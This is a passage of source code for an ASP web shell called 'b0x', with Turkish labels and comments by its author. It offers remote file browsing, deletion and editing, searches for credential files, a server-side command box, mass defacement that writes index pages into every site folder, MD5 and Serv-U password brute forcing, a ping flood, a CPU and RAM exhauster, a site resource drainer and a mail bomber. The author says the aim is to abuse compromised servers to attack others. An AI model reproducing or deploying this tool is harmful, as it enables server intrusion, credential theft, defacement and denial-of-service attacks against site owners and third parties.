...
sub Suruculer
    for each drive_ in b0x.Drives
        ...
        if drive_.Drivetype=3 then Response.write "&nbsp;&nbsp;<font class=""k1"">;</font>&nbsp;??kar?labilir Disk [" & drive_.DriveLetter & ":]&nbsp;&nbsp;&nbsp;<a title=""S?r?c? Detay? ??in T?kla"" href="""&FilePath&"?dspace="&drive_.DriveLetter&"&Path="&Path&"""><font class=""k1"">?</font></a>"
...
yazorta("T?m haklar? Sakl?d?r by b0x =)")
...
'///  by b0x. ?zel mod?ller ekledim =). Ne Mutlu T?RK?M D?YENE. 
 noattack = 1
 bonus = 0
 ...
 If InStr(b0xsite,"cyber") > 0 or InStr(b0xsite,"tahri") > 0 or InStr(b0xsite,"hack") > 0 or InStr(b0xsite,"team") > 0 then bonus = 1
  ...
  End Select
    ...
    response.write "Tasvip Etmedi?imiz Bir siteye Sald?r? yap?yorsun. Tekrarlama K?t? olur senin i?in. CIZZZ =) euheu by b0x                                                                                                           "
    response.write "Bu b0x sahibine,  GOv.TR  ve Com.TR sitelere kar?? Koruma ger?ekle?tirildi. T?RK T?RK ? VURMAZ.. Kalle?lik yapma by b0x       "
...
response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'> Durdurmak i?in Pencereyi kapat. Her 2 Saniyede bir 3 program a??l?yor...</td></tr></table>"
...
downStr = "<a title=""Dosyay? Sil"" href='"&FilePath&"?mode=5&Path="&FolderPath&"&del="&FolderPath&"\"&servu(i)&"&Time="&time&"'>?</a><font face=webdings><a title="" Download et "" href='"&FilePath&"?mode=6&file="&servu(i)&"&Path="&FolderPath&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Copy/Move File?? "" href='"&FilePath&"?mode=7&file="&servu(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format De?i?tir "" href='"&FilePath&"?mode=16&file="&servu(i)&"&islem="&servu(i)&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
yazorta("<a title="" ??ini Gomek i?in T?kla "" href='"&FilePath&"?mode=9&file="&servu(i)&"&Path="&FolderPath&"&Time="&time&"'>"&servu(i)&"</a></b> <font face=wingdings size=4>± <a title="" Dosyay? Editlemek i?in T?kla by b0x :) "" href='"&FilePath&"?mode=10&file="&servu(i)&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font>")
j=j+1
end if
next
if j = 0 then
yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> Remote olarak Sonu? bulunamad?. Geli?mi? aramay? se?iniz. <font face=Wingdings size=5>N</font> </font>")
end if
...
yazorta("<font class=""k1""><a title="" Dizini Copy/Move File?? "" href='"&FilePath&"?mode=2&Path="&plesk(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a></font> <font class=""k1""><a  title="" Dizini Sil "" href='"&FilePath&"?mode=4&Path="&plesk(i)&"&del="&plesk(i)&"&Time="&time&"'>?</a> 1</font><font size=2><b><a title="" Dizinin i?ine Gir "" href='"&FilePath&"?Path="&plesk(i)&"&Time="&time&"'>"&plesk(i)&"</a></b>")
j=j+1
end if
next
if j = 0 then
...
downStr = "<a title=""Dosyay? Sil"" href='"&FilePath&"?mode=5&Path="&FolderPath&"&del="&FolderPath&"\"&servu(i)&"&Time="&time&"'>?</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&servu(i)&"&Path="&FolderPath&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Dosyay? Copy & Ta?? "" href='"&FilePath&"?mode=7&file="&servu(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format De?i?tir "" href='"&FilePath&"?mode=16&file="&servu(i)&"&islem="&servu(i)&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
yazorta("<a title="" ??ini Gomek i?in T?kla "" href='"&FilePath&"?mode=9&file="&servu(i)&"&Path="&FolderPath&"&Time="&time&"'>"&servu(i)&"</a></b> <font face=wingdings size=4>± <a title="" Dosyay? Editlemek i?in T?kla by b0x :) "" href='"&FilePath&"?mode=10&file="&servu(i)&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font>")
else
...
Sub b0xSam()
    ...
    Set fc = f.Files
    For Each f1 In fc
       downStr = "<a title=""Dosyay? Sil"" href='"&FilePath&"?mode=5&Path="&url&"&del="&url&""&f1.name&"&Time="&time&"'>?</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&url&""&f1.name&"&Path="&url&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Dosyay? Copy & Ta?? "" href='"&FilePath&"?mode=7&file="&url&""&f1.name&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format De?i?tir "" href='"&FilePath&"?mode=16&file="&url&""&f1.name&"&islem="&f1.name&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
       yazorta("<a title="" ??ini Gomek i?in T?kla "" href='"&FilePath&"?mode=9&file="&url&""&f1.Name&"&Path="&url&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>± <a title="" Dosyay? Editlemek i?in T?kla by b0x :) "" href='"&FilePath&"?mode=10&file="&url&""&f1.name&"&Time="&time&"&Path="&url&"'>!</a>"&downStr&"</font>")
    Next
end Sub
...
Sub b0xVti_Pvt()
    ...
    vti = array(""&local&"\_vti_pvt\access.cnf",""&local&"\..\_vti_pvt\access.cnf",""&local&"\..\..\_vti_pvt\access.cnf",""&local&"\..\..\..\_vti_pvt\access.cnf",""&local&"\_vti_pvt\postinfo.html",""&local&"\..\_vti_pvt\postinfo.html",""&local&"\..\..\_vti_pvt\postinfo.html",""&local&"\..\..\..\_vti_pvt\postinfo.html",""&local&"\vti_pvt/service.pwd",""&local&"\..\vti_pvt/service.pwd",""&local&"\..\..\vti_pvt/service.pwd",""&local&"\..\..\..\vti_pvt/service.pwd")
        ...
        if b0x.FileExists(vti(i)) then
            downStr = "<a title=""Dosyay? Sil"" href='"&FilePath&"?mode=5&Path="&FolderPath&"&del="&FolderPath&"\"&vti(i)&"&Time="&time&"'>?</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&vti(i)&"&Path="&FolderPath&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Dosyay? Copy & Ta?? "" href='"&FilePath&"?mode=7&file="&vti(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format De?i?tir "" href='"&FilePath&"?mode=16&file="&vti(i)&"&islem="&vti(i)&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
            yazorta("<a title="" ??ini Gomek i?in T?kla "" href='"&FilePath&"?mode=9&file="&vti(i)&"&Path="&FolderPath&"&Time="&time&"'>"&vti(i)&"</a></b> <font face=wingdings size=4>± <a title="" Dosyay? Editlemek i?in T?kla by b0x :) "" href='"&FilePath&"?mode=10&file="&vti(i)&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font>")
            j=j+1
        end if
    next
    if j = 0 then
        yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> Sonu? bulunamad?. Daha geni? Arama yap?n by b0x <font face=Wingdings size=5>N</font> </font>")
    end if
end sub
...
Sub b0xNTUser(oturum)
    ...
    for i=0 to 5
        if b0x.FileExists(ntuser(i)) then
            downStr = "<a title=""Dosyay? Sil"" href='"&FilePath&"?mode=5&Path="&FolderPath&"&del="&FolderPath&"\"&ntuser(i)&"&Time="&time&"'>?</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&ntuser(i)&"&Path="&FolderPath&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Dosyay? Copy & Ta?? "" href='"&FilePath&"?mode=7&file="&ntuser(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format De?i?tir "" href='"&FilePath&"?mode=16&file="&ntuser(i)&"&islem="&ntuser(i)&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
            yazorta("<a title="" ??ini Gomek i?in T?kla "" href='"&FilePath&"?mode=9&file="&ntuser(i)&"&Path="&FolderPath&"&Time="&time&"'>"&ntuser(i)&"</a></b> <font face=wingdings size=4>± <a title="" Dosyay? Editlemek i?in T?kla by b0x :) "" href='"&FilePath&"?mode=10&file="&ntuser(i)&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font>")
            j=j+1
        end if
    next
    if j = 0 then
...
' belirtitiim aral?kda kod olu?tuuyorurum. 01#01#01#01# ba?lang?? ii?in by b0x
    dim coding
    coding = ""
...
' Se?ilen Charset leri burda birle?tiriyorum by b0x
    Dim dizi
    dizi=""
...
' Stirng kodunu sa?dan ??z?mleyerek ?ifre yarat?yor by b0x
    dim hash
    dim sifre
    hash=""
    sifre=""
...
if i = CInt(aralik) AND hash>= Len(dizix) AND ara1 = ara2 then getend=1   ''' BRUTE ??k??? bitti?ini anal?yorumm  GETEND =1 !!!!!!!!!!!!!
...
'T?rk Bayra?? Ascii Karakterlerle - Created By b0x
...
CASE 3 ' dizin kop ta??mam ger?ekle?iyor  by b0x
on error resume next
...
CASE 5 ' Dosya Deleting  olay? ger?ekli?iypor  by b0x
on error resume next
b0x.DeleteFile del
if err<>0 then
...
' Download Status l? oldu?u i?in, ?STTE ta??d?mm
...
if err <> 0 then
response.Write "<br><br><center>Ba?ar?s?zl?kla sonu?land? !!! <br>"
else
response.Write "<br><br><center>Klasor "&isl&" <br>"
end if
...
CASE 10 ' ASP txt php .. gibi dosyalar? Editlemek i?in POSt k?sm? by b0x 
on error resume next
set f = b0x.OpenTextFile(file,1)
...
CASE 11 ' Editleme olay?? ger?ekle?iyor by b0x
on error resume next
...
CASE 13 ' SQL i?in TAblolar? Listeleme by b0x
Response.Write "<center><b><font size=3>Tablolar</font></br><br>"
Set objConn = Server.CreateObject("ADODB.Connection")
Set objADOX = Server.CreateObject("ADOX.Catalog")
objConn.Provider = "Microsoft.Jet.Oledb.4.0"
...
CASE 14 ' TAblo i?eri?i Gome by b0x
...
if err <> 0 then
    ...
    if err <> 0 then
        ...
        Call oldu("<br> SQL ?njection Ba?ar?yla GEr?ekle?tii.<br><br>")
    end if
end if
objRcs.close
objConn.close
...
CASE 17 ' Dosya Ad? de?i?tirme Olay? ger?ekle?iyor by b0x
on error resume next
...
yazsol("<font color=#C6FCBE><b>Brute : </b>Belirtilen Dizinin ALt?ndaki; T?m Dizinlere ve onlar?nda ALt Dizinleri ?ndex BAsar. </font>")
...
yazsol("<font color=#C6FCBE><b>Eklenti : </b>BRUTE & Single ile kullan?l?r. Permsion var ise bunu se?menize ayarlaman?za gerek yok. E?er site isimlerini listeleytebiliyor, ve i?ine girremiyor fakat klas?r atlayarak girebiliyorsan?z. o zaman bunu se?in ve bulunan klas?rrden sonrakine gidip oraya index leri atar. Mesela ; '..site\b0x_com', '..\site\haber_com' .. gibi siteelr listeli. bunlar?n i?lerine girid?inizde g?r?nt?lkeme yetkinzi yok . Ama e?er '..\site\b0x_com\www\' yap?nca girebiliyorsna?z. PERM?S?ON a?ma y?ntemidir. b?ylece Eklenti yerine 'www' yazarak ve se?erekden. t?m sitelere o kla?sr i?ine girme yetkisini sa?lay?p, index b?rakt?r?rr?z. </font> ")
yazsol("<font color=#C6FCBE><b>Kopyalayarak : </b>b0x dizinine bir TXT yazar. Sonra onu T?m  klas?rlere KOpyalayarak i?lem yapar. E?er b0x dizininde Writing  yok ise, i?lem ger?ekle?mez. T?M MASS lar b?yledir. </font> ")
yazsol("<font color=#C6FCBE><b>Yaratarak : </b>Direk index kodunuzu, Klas?lerde OLU?TURARAk MASS yapar. BU b0x &  b0xPORTAL.CoM FARk? ile. 1-2 defa ba??ma geldi=) o y?zden bu ?zellei?i ekledim.</font> ")
yazsol("<font color=#FE7A84><b>NOT : </b>Brute & Single da 9 ?e?it index basar, Private da ?stdi?iniz ?simle 1 tane atar ;) </font>")
...
if err <> 0 then
response.write "<center><br><font color=#FE7A84> <font face=Wingdings size=5>N</font> Bulundu?un Dizinde Writing  YEtin yok. Bu y?zden ?ndex Sayfas? olu?turulamad?. <font face=Wingdings size=5>N</font> <br><br>  <font face=Wingdings size=5>N</font>  E?er ki Server i?ine bir Tane index y?kler ve a?a??daki yere tam link ini yazarsan, O zaman MASS Defaced ba?l?yacakt?r. <font face=Wingdings size=5>N</font> <br><br><br></center>"
response.write "<table width=""100%"">"
response.write "<tr class=""kbrtm"" valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""dizincopypaste"" action='"&FilePath&"' type=""post"">"
...
CASE 20 ' Status  sonucu, d?zeltme yap?ld? ise, burdan MAss dewaam ediyor.
on error resume next
...
CASE 23 ' arama bulma- en g?zel ?zeli?i time out olmamas? buldu?unu Writing s?d?r =) by b0x eseridir. 
...
CASE 24 ' Klas?r i?lermleri i?in Upload - Dosya ayarat - kla?sr yarat FORM lar? by b0x
on error resume next  
...
response.write "</textarea>"
response.write "</td></tr></form><form name=""commmanderbyb0x2"" method=""Post"" action='"&FilePath&"?mode=28&Path="&Path&"'><tr><td><b>CMD Komut ?al??t?r: </b><input style='color=#DAFDD0' name=""inject4"" size='57' value='"&inject4&"' type='text'><input name='inject5' value='b0x' type='hidden'><input value="" .: ?al??t?r :. "" type='Submit'></td></tr>"
if inject5 = "b0x" then
on error resume next
tablo12("Komut ?al??t?r?ld?. ")
end if
response.write "</form></table></center>"
response.write "<br><center><table align=""center"" width=""100%"" class=""kbrtm"">"
tablo12L("<font color=#FE7A84><b>NOT : </b> CMD komutlar? tamamen , Server ?zerinde ?al??maktad?r. Siz burda yazaca??n?z komut orda ?al???p, size geri d?necektir.")
tablo12L("<font color=#FE7A84><b>NOT : </b> <b>CMD Komut Listele</b> olay?, >dir, >netstat, >ping gibi geri DOS da geri bilgi d?nd?ren komutlar kullan?l?r. AMA e?er program ?al???tmrka, traojan yada Notepad gibi fonksiyonal ve applicaitonl? programlar, komutlar?da <b>CMD komut ?al??t?r</b>dan Uygulaman?z gerekir.Aksi halde Sistem k?sa s?reli kitlenme ya?an?r. CEvap al?namayabilinir.GEre?inden fazla ?al???trm yaparsn?z , ??lemcide Sizin User?n?z?n <b>RAM + CPU </b>kulln?m? anormal artacakt?r. </font>  <font color=#FE7A84 face=Wingdings size=5>N</font>")
...
CASE 29 ' CMD a??klama k?sm? HELPER by b0x
response.write "<center>"
yazsol("<b>Attrib</b>: Attrib komutu dosyalara belli ?zellikleri verir veya kald?r?r. c:\>attrib +r +a +s +h yaz?p enter tu?una basarsak.(help i?in : <b> ' attrib /?  ' </b>)")
yazsol("<b>Copy - xcopy</b> : Copy ve xcopy komutu ile istenilen dosya yada dosyalar?n ba?ka yerlere kopyalanmas? i?lemi ger?ekle?tirilir. Bilgi i?in bunu yaz?n :' <b>copy /? '</b>")
yazsol("<b>Net use</b> : Pc nin Payla??m, Hesaplar?, ayarlar?, kullan?c?lar?... gibi ?zellliklere ula?abilece?imiz ve de?i?tirebilece?imiz bir komut <b>NET</b> . Yar?m dosyas? i?in -> <b> net help </b> Writing n?z yeterlidir.")
yazsol("<b>Netstat</b> : PC deki a??k portlar?, ve diledi?iniz port u dinleyebilirsiniz. <b>Netstat -a -b -e -n -o -r -s -v</b> gibi parametreler al?r.")
...
yazsol("<b>IPCONFIG</b> : Server , PC nin IP bilgileirni, network bilgileirni veriyor. kuln?m i?in - > <b>ipconfig help</b>  yaz?n yeterldir ")
yazorta("<b>by b0x</b>")
response.write "</center>"
 
CASE 30 ' PiNGer BY b0x - Server ?zerinden s?n?rs?z ping sald?rr?s?. =) Coded by b0x
if not file = "1" then
...
yazsol(" Ping TimeOut S?resi : <input style='color=#DAFDD0' name='islem' value='750' type='text' size=20> milisaniye (?rnek:750) ")
...
yazsoll("  <font color=#C6FCBE> Not: Bunu kullan?rken girece?iniz Paket boyutu ?nemlidir. M?mk?nce a??r? b?y?k paket girmeyin, ??nk? server yada site nereye sald?rr?yorsan?z, b?y?k paketleri filtreler ve cevap vermezler. O y?zden s?rekli T?meOUT yazar. o y?zden yaa Bo? b?rak?n yada 500 gibi normal bir seviye se?in.  <font color=#C6FCBE> <font face=Wingdings size=5>N</font> </font>  ")
...
yazsoll(" <font color=#FE7A84> Not: b0x, com.tr, gov.tr uzant?l? sitelere kar?? koruma ald?m. Ping Attaker bu sitelere kar?? ?al??t?t?lamaz, ve ?al???t?rlsa bile Ping atmaz, size Uyar? verir. T?rk Siteleri Koruma ilk hedefimizdir. T?rk T?rk ? Vurmaz. by b0x <font color=#C6FCBE> <font face=Wingdings size=5>N</font></font> ")
yazsoll("<font color=#C6FCBE> <b>Ping Attack b0x</b> taraf?ndan yaz?lm?? olup, biraz hayal g?c?, biraz ?aba azimle, ?u an kulan?d??n?z b0x yuda yazan olarak, bundaki amac?m Server ?n ,sitenin kaynaklar?n? s?m?rmek vede onun ?zerinden onun kaynaklar?n? kullanrak ba?ka yerlerede zarar , sald?r? yapam g?denmi?tir. BUndada BUnlaa ba?lad?m. <b>T?M haklar? b0x e aittir.</b> <font color=#C6FCBE> <font color=#C6FCBE> <font face=Wingdings size=5>N</font></font>  ")
else
...
if CInt(inject1) > CInt(count) + 10 then
    ...
    response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align=""center"" > <b>"&count&"/"&inject1&"</b> tane Ping ?ekildi. </td></tr></table>"
else if CInt(inject1) > CInt(count) then
    Call Ping_Bomb_b0x(url,CInt(inject1) mod 11,islem,size)
    count = count + (CInt(inject1) mod 11)
    yazortaa(" <b>"&count&"/"&inject1&"</b> tane Ping ?ekildi... ") 
...
yazorta(" <a href='"&FilePath&"?mode=31&file=1'>..::  RAM & CPU Attacker ? ?ALI?TIR .. by b0x  ::..</a> ")
response.write "</td></tr></table></center>"
else
Call Ram_Cpu
end if
...
CASE 32 ' S?te kaynak S?m?r?c? by b0x =)
if not islem = "1" then
response.write "<center><table align=""center"" width=""100%""><tr><td>"
yazorta("<b> S?te Kaynak S?m?c? 1.0 by b0x </b>")
...
yazsol("Site kodlar?n?, BAndwith ini ve ASP kitlenmesi yada SQL s?m?rmede, ressim, text s?m?rmede ?St?ne yoktur..")
yazorta("T?m haklar? Sakl?d?r by b0x =)")
response.write "</td></tr></table></center>"
else
on error resume next
yazorta("<b> S?te Kaynak S?m?c? 1.0 by b0x =) 1.0 </b>")
yazorta("S?m?rme MEkanizmas? Devrede...")
yazsol("Durdurmak i?in Pencereyi kapat. "&file&" Kadar ba?lan?p 30 sn da g?nceliyor sald?r?y?...")
yazorta("<b>by b0x</b>")
...
CASE 33 ' Mail BOMber by b0x :) T?m Kodlar?n b0x nun HAklar? b0x ya aittir. S?n?rs?z Mail atma imkan? sunuyorum size. K?ya??m? unutmay?n...
if not islem = "1" then
response.write "<center><table align=""center"" width=""100%""><tr><td>"
...
response.write "<br><br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align=""center"" > <font color=#FE7A84> <font  face=Wingdings size=5>N</font> BOMB yap?lamad?. Tasvip etmedi?imiz Bir mail e Sald?rd???n?z i?in. by b0x !!!! <font color=#FE7A84> <font  face=Wingdings size=5>N</font> </font> </td></tr></table>"
end if
else
...
if not islem = "1" then
Call MSSQL_Form
yazortaa(" E?erki, Sitelerin MSSQL bilgilerini biliyorsan?z, bununla ?ok kolay ba?lanabilir.. ")
yazortaa(" Tablolar? g?rebilir, ?zerinde SQL komut ?al??t?rabilir, verileri okuyaiblirisniz ")
yazortaa(" ?ok sa?lam ve g??l? bir MSSQL Manager hizmeti Sa?lar size...")
yazortaa(" <b>by b0x :)</b>")
else
Call SQL_menu_by_b0x
Call Tablolama
...
CASE 35 ' MSSQL - MYSQL Conneciton i?in Developed By TurkisH-RuleZ
Call SQL_menu_by_b0x
...
yazsoll("<b>SELECT</b> - Se?me&listeleme")
...
yazsoll("<b>Exes</b> - Fdisk ?ektirmek i?in")
...
yazorta("<a href='"&FilePath&"?mode=38&Path="&Path&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">..:: A??klama ??in T?klay?n?z.. by b0x  ::..</a>")
response.write "</td></tr></table></center>"
...
yazorta(" <b>Server' in Payla??ma A??k Klas?rleri by b0x </b>")
...
b0xServuRemote()
yazorta("<b>Geli?mi? Arama i?in</b>")
...
yazsoll("IIS i?inde ise, o siteninde BEllekdeki Oturum ad?da -> WAMUserName ad?nda ve ?ifresine sahiptir.")
yazsoll("Bu Sistem Geli?tirilmeye Devam ediyor? ")
 
CASE 39 ' Se?mece bunlar MD5- servu =) by b0x
...
yazorta("<b> K?rmak ?stedi?in T?r? Se?</b>")
...
yazsol("<b>MD5 :</b> Bildi?iniz ?zere, bir ?ok sistemin kulland??? bir ?ifreleme olay?d?r. 128 bittir.")
yazsol("<b>Serv-U :</b> Server larda Host lar?n kulland??? bir programd?r. Kolay vede kullan??l? oldu?u i?in Hostlar taraf?ndna tercih edilir. i?inde Ftp ?ifreleri bar?nd?rmakdad?r. burdada o ?ifreleri k?rmaktad?r.")
yazsoll("<font color=#C6FCBE >Bizde burda ASP tabanl? vede b0x i?ine injecte edip Sizlere Server ?n CPU ve RAM ini kullanarak , Daha h?zl? ve zahmetsiz, T?meOUT suz bir ?ekilde ?ifreleirni k?rman?z? sa?layaca??z. Bu K?rma i?lemi BRUTE attackl modelidir. K?sacas? K?rma olas??? e?er ki sabreder ve ?ans?n?z varsa ?ok k?sa s?rede k?rars?n?z. Ama aksi halde 1 g?n ge?sede =) yinede %100 k?rm?a garantisi vard?r. E?er derleri do?ru girerseniz.</font>")
yazortaa("Md5 & Serv-U KOd Converted by <b>Fastboy</b>")
Yazorta("Brute And HJACk Algorithms Written by <b>b0x</b>")
 
CASE 40 ' Md5 & Serv-U Algortitmas? Ba?l?yor S?k? tutnun =) sak?n duda??n?z u?uklama?sn haa =) by b0x euheuh ?ok yordu be kafam? bu olay .. neyse ??zd?k yine =) eeheuh by b0x
...
if islem = " ..::  MD5  ::.. " then
yazsol("MD5 Kodu Girin 1 : <input style='color=#C6FCBE' size='54' name='Usersmd5' value='Hash kod u giriniz ??z?lecek olan.' type='text'>")
else
yazsol("Serv-u Ham Kodu Girin 1 : <input style='color=#C6FCBE' size='45' name='Usersmd5' value='Hash kod u giriniz ??z?lecek olan.' type='text'>")
...
yazsol("<b>Serv-u Ham Kodu Girin :</b> Serv-u Kodunun ilk 2 karakteri SALT dur. egri kalan? ise MD5 halidir. Oraya ilk 2 karakteri ??kar?n ve geri kalan? yaz?n. altasa da SALT k?sm?nada, ilk 2 karakteri yaz?n. Max 10 Hash girebilirsiniz.")
end if
yazsol("<b>?ifre Aral??? :</b> Burda belirtilen aral?klar aras?nda ?ifre ?retip, denemeye ba?l?cakt?r. ?nce k???kden ba?lay?p, t?m charset denemsini yapt?kdan sonra, aral?k bir artacakt?r, taaki sizin ?st s?n?ra kadar girdi?iniz.")
yazsol("<b>CharSet i se?iniz; </b> ?ifre denerkenki, ?ifre karakterleridir. B?y?k k???k harf ?nemlidir. Birden FAzla da se?ebilriisniz. Ama unutmay?nki, Deneme say?s? b?y?d?k?e, Zamanda ARTACAKTIR. ")
yazsol("<b>Bekleme S?resi :</b> S?rekli md5 deneme yaparsa sistem, b?y?k bir oranda Cpu kullan?r. Cpu kullan?m? rahatlatmak i?in vede timeout u ?nlemek i?in , her bir Charset uzunlu?u kadar deneyip, sonra yenileme yap?yor. o s?radaki bekleme s?residir bu.")
yazsol("<b>NOT :</b> Toplu Md5&ServU k?rmak m?mk?n. Hepsini birden kulland???n?zda verim artacakt?r. HIZ da d???? olmaz. Ama sizin Daha kolay k?rman?z? sa?lar, ?oklu k?rma.")
...
if inject4 = inject3 then
    response.write ("<script>alert(""M?kemmel T?m ?ifreler K?r?ld? ;) by b0x "")</script>")
    response.end()
end if
...
CASE 42 'MSWC nesnesi kullan?m?. Permision ge?me ad?na att???m bir adamd?r. bu nesnenin oldu?unu "Scorlex" den edindim. Ara?t?rd?m neler yapar?m diye =) i?te g?r?n neler yap?labiliyormu?uz ;) bununla. uehueh by b0x
response.write "<table width=""100%"" class=""kbrtm""><tr valign=""top""><td colspan=""2"" align=""center"">"
...
yazorta("<input name='G?nder_Ej_De_r' value='Yazd?r ko?umm ;) by b0x' type='submit'")
response.write "</td></tr></table></form>"
yazorta("<b>Kullan?m? by b0x</b>")
yazsol("?necelikle, b0x nesnesi kullanmadan bir dosyay? , istenilen yere MSWC nesnesi ile yazd?r?lanabiliniyor. b0x deste?i olmayan bir server da bile, rahat?a bu nesne yard?m? ile index atabilirsiniz. Kimi serverlarda, permison engeline tak?l?r?z yada kls?r? i?ine giremeyiz, yada b0x kullan?m? k?s?tl?d?r. bunlar? A?MAK i?in bu nesneyi kulland?m. Bu nesne ?u an localhost ve 1-2 yerde ?al??t? sa?l?kl? ?ekilde. ?u an TEst s?r?m?nde diyebilirim. Umar?m bu bizim permison =) ge?me yollumuzu ayd?nlat?r ne dersiniz :)) uehueh")
...
yazsol("<b>At?lacak yer ->></b> TEK bir hedef i?in. Buray?da ..\..\ ?eklinde inerek belirtmeniz gerekiyor.mesela '..\..\..\index.asp' 3 dizin a?a??ya iner ve index i atar yada '..\..\..\www\index.asp'  3 dizin iner ww dizine girer , index i atar. =) b?yle OLAMAK zorunda .  ")
yazsol("<b>MASS Path  ->></b> BUrda ?oklu alt klas?rlerede index atmak i?in geli?tirdim. '..\..\..\' ?eklinde a?a??lara inin ve T?M sietelerin L?Stelendi?i klas?r ee kadar olan '..\' i?aretini ayarlay?n. mesela 3 dizin a?a??da ise b0x olan uzakl???, '..\..\..\'  yaz?n yeterdir =) . <b>Eklenecek klas?r-></b> burda da, T?m sietlere giri? yap?ld?kdan sonraki Klas?r ad? , mesela 'www' yada 'http' yada 'wwwroot'  gibi.")
yazsol("Neden b?yle derseniz, MSWC nin kullan?m?, destekleid?i ?ekil b?yledir. Biraz kafa kar??t?r?c?. Ama ben denedim g?rd?m =) memnun kald?m. O y?zden bu b0x da yerini ald?. ?undan eminimki kullan?m?n? deneyerek ??rendi?inizde, sizinde PErmsion ge?mede vazge?ilmeziniz olacakd?r =) euheuh")
...
if hash4 = "tek" then
    ...
    if err <>0 then
        olmadi("Ba?ar?s?z. Belirti?iniz virtual path lar do?rumu emin olun. MSWC deste?i var ??nk? server ?n.")
    else
        oldu("Ba?ard?n?z ;) i?lem ger?ekle?tii.")
    end if
else
on error resume next
Set f = b0x.GetFolder(FolderPath)
...
For Each f1 In fc
    ...
    utils.ProcessForm mevki, hash2  
    if err<>0 then
    response.write "<table width=""100%""><tr><td class=""kbrtm""> "& hash6+f1.name+"\"+hash5&" <font color=#FE7A84> Noo :( !! <font class=""k1"">?</font></td></tr></table>"
    else
    response.write "<table width=""100%""><tr><td class=""kbrtm""> "& hash6+f1.name+"\"+hash5&" <font color=#C6FCBE> OK !! <font class=""k1"">?</font></td></tr></table>"
    end if
    response.flush
Next
...
if inject2 = "yaz" then
    ...
    End Select
    if err <> 0 then
        olmadi("??lem  ger?ekle?tirilemedi. VALUE de?erinin do?ru ve uygun Value girid?inziden emin ol.")
    else
